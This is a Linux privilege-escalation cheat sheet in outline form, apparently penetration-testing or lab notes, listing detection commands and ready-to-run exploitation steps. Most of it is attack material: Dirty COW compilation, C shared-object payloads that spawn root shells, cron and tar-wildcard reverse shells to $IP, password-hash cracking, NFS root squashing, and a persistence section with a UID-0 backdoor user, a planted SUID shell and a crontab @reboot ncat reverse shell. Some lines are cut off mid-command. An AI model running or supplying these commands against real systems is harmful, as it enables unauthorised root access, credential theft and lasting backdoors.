## Linux Privilege Escalation

### Strategy

- Enumeration
	- id
	- whoami
	- Linux Smart Enumeration
	- LinEnum
	- https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/

- Strategy

	- Read the results
	- Create a checklist
	- Look around
	- First Sudo, Cron, SUID...
	- Enumerate root processes
	- Check internal ports

### Permissions in Linux

- Users

	- Accounts

		- /etc/passwd

	- Password Hashes

		- /etc/shadow

	- Identified

		- UID

			- Real

				- /etc/passwd

			- Effective

				- Set real ID of another user when executing a process as it
				- whoami uses it

			- Saved

				- Ensure that SUID process can temporarily switch user's effective ID back

- Groups

	- Groups

		- /etc/group

- Files

	- Read
	- Write
	- Execute

- Directories

	- Execute

		- Enter

	- Read

		- List

	- Write

		- Create

- Special Permissions

	- SUID

		- File get executed with privileges of the owner

	- SGID

		- File get executed with the privileges of the file group.

- Viewing Permisions

	- 10 characters

		- 1

			- - for file
			- d for directory

		- 2-4

			- Owner

				- read, write, execute

		- 5-7

			- Group

				- read, write, execute

		- 8-10

			- Others

				- read, write, execute

		- SUID/SGID

			- s in execution position

### Attack Vectors

- Kernel

	- Detection

		- $ uname -a
		- searchsploit linux kernel
		- ./linux-exploit-suggester-2.pl -k 2.6.32

	- Exploitation

		- Dirty Cow
		- https://gist.github.com/KrE80r/42f8629577db95782d5e4f609f437a54
		- $ gcc-pthread c0w.c -o c0w
		- $ ./c0w
		- $ /usr/bin/passwd 

- Service

	- Detection

		- $ ps aux | grep "^root"
		- $ PROGRAM --version
		- $ dpkg-l | grep PROGRAM 
		- $ rpm –qa| grep PROGRAM

	- Exploitation

		- $ ./lse.sh -l 1 -i
		- exploit-db.com/exploits/1518
		- $ mysql> select do_system('cp /bin/bash /tmp/rootbash; chmod+s /tmp/rootbash');
		- $ /tmp/rootbash -p
		- Port Forwarding

			- $ ssh -R $LOCAL_PORT:127.0.0.1:$TARGET_PORT $USERNAME@LOCAL_IP

- Weak File Permissions

	- /etc/shadow

		- Detection

			- $ ./lse.sh -i
			- $ find /etc -maxdepth 1 -writable -type f
			- $ find /etc -maxdepth 1 -readable -type f
			- $ find / -executable -writable -type d 2> /dev/null

		- Exploitation

			- World readable?

				- $ ls -l /etc/shadow
				- $ head -n 1 /etc/shadow
				- $ echo '$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0' > hash.txt
				- $ john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
				- $ su 

			- World writable?

				- $ mkpasswd -m sha-512 newpassword
				- Replace hash

					- root:$6$DoH8o2GhA$5A7DHvXfkIQO1Zctb834b.SWIim2NBNys9D9h5wUvYK3IOGdxoOlL9VEWwO/okK3vi1IdVaO9.xt4IQMY4OUj/:17298:0:99999:7:::

	- /etc/passwd

		- Detection

			- $ ./lse.sh -l 1 -i
			- $ find /etc -maxdepth 1 -writable -type f
			- $ find /etc -maxdepth 1 -readable -type f
			- $ find / -executable -writable -type d 2> /dev/null
			- root:x:0:0:root:/root:/bin/bash

				- The x instructs to look for the password hash in the /etc/shadow
				- root::0:0:root:/root:/bin/bash

					- In some Linux you can delete the x = no password

		- Exploitation

			- World writable?

				- $ openssl passwd "password"
				- Add hash to second position

					- root:L9yLGxncbOROc:0:0:root:/root:/bin/bash

				- $ su
				- newroot:L9yLGxncbOROc:0:0:root:/root:/bin/bash
				- $ su newroot

	- Backups

		- Detection

			- $ ./lse.sh -i
			- $ find /etc -maxdepth 1 -writable -type f
			- $ find /etc -maxdepth 1 -readable -type f
			- $ find / -executable -writable -type d 2> /dev/null
			- $ ls -la /home/user
			- $ ls -la /
			- $ ls -la /tmp
			- $ ls -la /var/backups

		- Exploitation

			-  World readable?

				- $ head -n 1 /.ssh/root_key
				- $ grep PermitRootLogin /etc/ssh/sshd_config
				- PermitRootLogin yes?

					- chmod 600 root_key
					- ssh -i root_key root@$IP

- Sudo

	- Commands

		- $ sudo PROGRAM
		- $ sudo –u USERNAME PROGRAM
		- $ sudo -l

	- Methods

		- $ sudo su
		- $ sudo -s
		- $ sudo -i
		- $ sudo /bin/bash
		- $ sudo passwd

	- Shell Escape Sequences

		- Detection

			- $ ./lse.sh -i
			- $ sudo -l

		- Exploitation

			- https://gtfobins.github.io/
			- $ find / -perm -u=s -type f 2>/dev/null | grep -E "/aria2c|/arp|/ash|/base32|/base64|/bash|/busybox|/cat|/chmod|/chown|/chroot|/cp|/csh|/curl|/cut|/dash|/date|/dd|/dialog|/diff|/dmsetup|/docker|/emacs|/env|/eqn|/expand|/expect|/file|/find|/flock|/fmt|/fold|/gdb|/gimp|/grep|/gtester|/hd|/head|/hexdump|/highlight|/iconv|/ionice|/ip|/jjs|/jq|/jrunscript|/ksh|/ksshell|/ld.so|/less|/logsave|/look|/lwp - download|/lwp-request|/make|/more|/mv|/nano|/nice|/nl|/node|/nohup|/od|/openssl|/perl|/pg|/php|/pico|/python|/readelf|/restic|/rlwrap|/rpm|/rpmquery|/rsync|/run-parts|/rvim|/sed|/setarch|/shuf|/soelim|/sort|/start-stop-daemon|/stdbuf|/strace|/strings|/systemctl|/tac|/tail|/taskset|/tclsh|/tee|/tftp|/time|/timeout|/ul|/unexpand|/uniq|/unshare|/uudecode|/uuencode|/vim|/watch|/wget|/xargs|/xxd|/zsh|/zsoelim"

	- Abusing Intended Functionality

		- Detection

			- $ sudo -l

		- Exploitation

			- $ sudo apache2 -f /etc/shadow
			- $ echo '$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0' > hash.txt'
			- $ john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
			- $ su

	- Environment Variables

		- LD_PRELOAD

			- Detection

				- $ sudo -l

			- Exploitation

				-  env_keep+=LD_PRELOAD ?

					- #include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
unsetenv("LD_PRELOAD");
setresuid(0,0,0);
system("/bin/bash -p");
}
					- $ gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c
					-  $ sudo LD_PRELOAD=/tmp/preload.so apache2

		- LD_LIBRARY_PATH

			- Detection

				- $ sudo -l
				-  $ ldd /usr/sbin/apache2

			- Exploitation

				- #include <stdio.h>
#include <stdlib.h>
static void hijack() __attribute__((constructor));
void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
				- $ gcc -o libcrypt.so.1 -shared -fPIC library_path.c
				-  $ sudo LD_LIBRARY_PATH=. apache2

- Cron Jobs

	- File Permissions

		- Detection

			- $ ./lse.sh -l 1 -i

		- Exploitation

			- Write to a program that is part of the cron job?

				- $ cat /etc/crontab
				- $ locate overwrite.sh
				- $ ls -l /usr/local/bin/overwrite.sh
				- #!/bin/bash
bash -i >& /dev/tcp/$IP/$PORT 0>&1
				- nc –nvlp $PORT

	- PATH Environment Variable

		- Detection

			- $ ./lse.sh -l 1 -i

		- Exploitation

			- $ cat /etc/crontab
			- #!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
			- $ chmod +x /home/user/overwrite.sh
			- $ /tmp/rootbash –p

	- Wildcards

		- Detection

			- $ ./lse.sh -l 1 -i
			- gtfobins.github.io

		- Exploitation

			- $ ls *
% touch ./-l
$ ls *
			- $ cat /etc/crontab
			- $ cat /usr/local/bin/compress.sh
			- $ msfvenom -p linux/x64/shell_reverse_tcp LHOST=$IP LPORT=$PORT -f elf -o shell.elf
			- $ chmod +x /home/user/shell.elf
			- $ touch /home/user/--checkpoint=1
$ touch /home/user/--checkpoint-action=exec=shell.elf
			- nc -nvlp $PORT

- SUID / SGID

	- SUID / SGID Files

		- Detection

			- $ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null

	- Shell Escape Sequences

		- Detection

			- https://gtfobins.github.io/

	- Known Exploits

		- Detection

			- $ ./lse.sh -l 1 -i
			- $ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null

		- Exploitation

			- $ /usr/sbin/exim-4.84-3 --version
			- searchsploit exim 4.84
			- $ sed -e "s/^M//" 39535.sh > privesc.sh
			- $ chmod + privesc.sh
			- $ ./privesc.sh

	- Shared Object Injection

		- Detection

			- $ ./lse.sh -l 1 -i
			- $ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \;
2> /dev/null

		- Exploitation

			- $ strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
			- #include <stdio.h>
#include <stdlib.h>
static void inject() __attribute__((constructor));
void inject() {
setuid(0);
system("/bin/bash -p");
}
			- $ gcc -shared -fPIC -o /home/user/.config/libcalc.so libcalc.c
			- $ /usr/local/bin/suid-so

	- PATH Environment Variable

		- Detection

			- $ ./lse.sh -l 1 -i

		- Exploitation

			- $ strings /path/to/file
			- $ strace -v -f -e execve COMMAND 2>&1 | grep exec
			- $ ltrace COMMAND
			- $ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \;
2> /dev/null
			- $ strings /usr/local/bin/suid-env
			- $ strace -v -f -e execve /usr/local/bin/suid-env 2>&1 | grep service
			- $ ltrace /usr/local/bin/suid-env 2>&1 | grep service
			- int main() {
setuid(0);
system("/bin/bash -p");
}
			- $ gcc -o service service.c
			- $ PATH=.:$PATH /usr/local/bin/suid-env

	- Abusing Shell Features (#1)

		- Detection

			- $ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null

		- Exploitation

			- $ strings /usr/local/bin/suid-env2
			- $ strace -v -f -e execve /usr/local/bin/suid-env2 2>&1 | grep service
			- $ ltrace /usr/local/bin/suid-env2 2>&1 | grep service
			- $ bash --version
			- $ function /usr/sbin/service { /bin/bash -p; }
$ export –f /usr/sbin/service
			- $ /usr/local/bin/suid-env2

	- Abusing Shell Features (#2)

		- Detection

			- $ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null

		- Exploitation

			- $ strings /usr/local/bin/suid-env2
			- $ strace -v -f -e execve /usr/local/bin/suid-env2 2>&1 | grep service
			- $ ltrace /usr/local/bin/suid-env 2>&1 | grep service
			- $ env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chown
			- $ /tmp/rootbash -p

- Passwords & Keys

	- History Files

		- Detection

			- $ cat ~/.*history | less

		- Exploitation

			- $ su root

	- Config Files

		- Detection

			- $ ls
			- $ cat myvpn.ovpn
			- $ cat /etc/openvpn/auth.txt

		- Exploitation

			- $ su root

	- SSH Keys

		- Detection

			- $ ls -l /.ssh
			- $ find / -name authorized_keys 2> /dev/null
			- $ find / -name id_rsa 2> /dev/null

		- Exploitation

			- $ cat /.ssh/root_key
			- chmod 600 root_key
			- ssh -i root_key root@$IP

- NFS

	- Root Squashing

		- Detection

			- $ showmount -e $IP
			- $ nmap –sV –script=nfs-showmount $IP $LOCAL_DIRECTORY

		- Exploitation

			- $ cat /etc/exports
			- $ showmount -e $IP
			- mkdir /tmp/nfs
			- mount -o rw,vers=2 $IP:/tmp /tmp/nfs
			- msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
			- chmod +xs /tmp/nfs/shell.elf
			- $ /tmp/shell.elf

### Common Exploits

- CVE-2010-3904

	- Kernel <= 2.6.36.rc8
	- https://www.exploit-db.com/exploits/15285

- CVE-2010-4258

	- Kernel <= 2.6.37 'Full-Nelson.c'
	- https://www.exploit-db.com/exploits/15704

- CVE-2012-0056

	- Kernel 2.6.32 < 3.2.2
	- https://git.zx2c4.com/CVE-2012-0056/about/

- CVE-2016-5195

	- Kernel  <= 3.19.0-73.8
	- g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
	- https://dirtycow.ninja/
	- https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
	- https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c

### Tools

- Basic Information Gathering

	- cat /etc/passwd
	- ip a
	- hostname
	- cat /etc/issue 
	- cat /etc/*-release
	- uname -a
	- ps aux
	- netstat -ano
	- ifconfig
	- /sbin/route
	- netstat -anp
	- ss -anp
	- iptablrd
	- iptables-save
	-  ls -lah /etc/cron* 
	- cat /etc/crontab 
	- dpkg -l
	- find / -writable -type d 2>/dev/null
	-  cat /etc/fstab 
	- mount
	-  /bin/lsblk 
	- lsmod 
	-  /sbin/modinfo libata 
	- find / -perm -u=s -type f 2>/dev/null

- Useful

	- which awk perl python ruby gcc cc vi vim nmap find netcat nc wget tftp ftp 2>/dev/null

- GTFOBins

	- Commands

		- $ find / -perm -u=s -type f 2>/dev/null | grep -E "/aria2c|/arp|/ash|/base32|/base64|/bash|/busybox|/cat|/chmod|/chown|/chroot|/cp|/csh|/curl|/cut|/dash|/date|/dd|/dialog|/diff|/dmsetup|/docker|/emacs|/env|/eqn|/expand|/expect|/file|/find|/flock|/fmt|/fold|/gdb|/gimp|/grep|/gtester|/hd|/head|/hexdump|/highlight|/iconv|/ionice|/ip|/jjs|/jq|/jrunscript|/ksh|/ksshell|/ld.so|/less|/logsave|/look|/lwp - download|/lwp-request|/make|/more|/mv|/nano|/nice|/nl|/node|/nohup|/od|/openssl|/perl|/pg|/php|/pico|/python|/readelf|/restic|/rlwrap|/rpm|/rpmquery|/rsync|/run-parts|/rvim|/sed|/setarch|/shuf|/soelim|/sort|/start-stop-daemon|/stdbuf|/strace|/strings|/systemctl|/tac|/tail|/taskset|/tclsh|/tee|/tftp|/time|/timeout|/ul|/unexpand|/uniq|/unshare|/uudecode|/uuencode|/vim|/watch|/wget|/xargs|/xxd|/zsh|/zsoelim"

	- URL

		- gtfobins.github.io

- Custom (rootbash)

	- int main() {setuid(0);system("/bin/bash -p");}
	- $ gcc -o $NAME $FILE

- MSFVenom

	- msfvenom-p linux/x86/shell_reverse_tcp LHOST=$IP LPORT=$PORT$ -f elf > shell.elf

- Reverse Shell Generator

	- https://github.com/mthbernardes/rsg

- Linux Smart Enumeration

	- Commands

		- $ ./lse.sh -l 1

	- URL

		- https://github.com/diego-treitos/linux-smart-enumeration

	- Categories Performed

		- User related tests
		- Sudo related tests
		- File system related tests
		- System related tests
		- Security measures related tests
		- Recurrent tasks related tests
		- Network related tests
		- Services related tests
		- Processes related tests
		- Software related tests
		- Container related tests

- LinEnum

	- Command

		- $ ./linenum -s -r Output_LinEnum.txt -e /tmp/ -t

	- URL

		- https://github.com/rebootuser/LinEnum

	- Categories Performed

		- Kernel and Distribution
		- System Information
		- User Information
		- Privilege Access
		- Enviromental
		- Jobs/Tasks
		- Services
		- Version Information
		- Default/Weak Credentials
		- Useful File Searches
		- Platform/Software Tests

- BeRoot

	- Commands

		- $ python beroot
		- $ python beroot --password $PASSWORD

	- URL

		- https://github.com/AlessandroZ/BeRoot

	- Categories Performed

		- GTFOBins
		- Wildcards
		- Sensitive Files
		- Services
		- SUID Binaries
		- Path Enviroment Variable
		- NFS Root Squashing
		- LD_PRELOAD
		- Sudoers file
		- Sudo list
		- Python Library Hijacking
		- Capabilities
		- Ptrace Scope
		- Exploit Suggest

- Linux Priv Checker

	- https://github.com/linted/linuxprivchecker

- Unix PrivEsc Check

	- http://pentestmonkey.net/tools/audit/unix-privesc-check

- Linux Exploit Suggester

	- https://github.com/jondonas/linux-exploit-suggester-2

### Persistence

- Create a root user

	- sudo useradd -ou 0 -g 0 john 
	- sudo passwd john 
	-  echo "linuxpassword" | passwd --stdin john 

- SUID Binary

	- TMPDIR2="/var/tmp"
	- echo 'int main(void){setresuid(0, 0, 0);system("/bin/sh");}' > 
	- $TMPDIR2/croissant.c 
	- gcc $TMPDIR2/croissant.c -o $TMPDIR2/croissant 2>/dev/null
	- rm $TMPDIR2/croissant.c 
	- chown root:root $TMPDIR2/croissant 
	- chmod 4777 $TMPDIR2/croissant  Crontab - Reverse shell  (crontab -l; echo "@reboot sleep

- Crontab - Reverse Shell

	- (crontab -l; echo "@reboot sleep 200 && ncat 192.168.1.2 4242 -e  /bin/bash")|crontab 2> /dev/null 

- Backdoor Target User .bashrc
- Backdoor Startup Service
- Backdoor Target User Starup File
- Backdoor Driver
- Backdoor APT.CONF.D

### Hardening

- https://github.com/ernw/hardening/blob/master/operating_system/linux/ERNW_Hardening_Linux.md
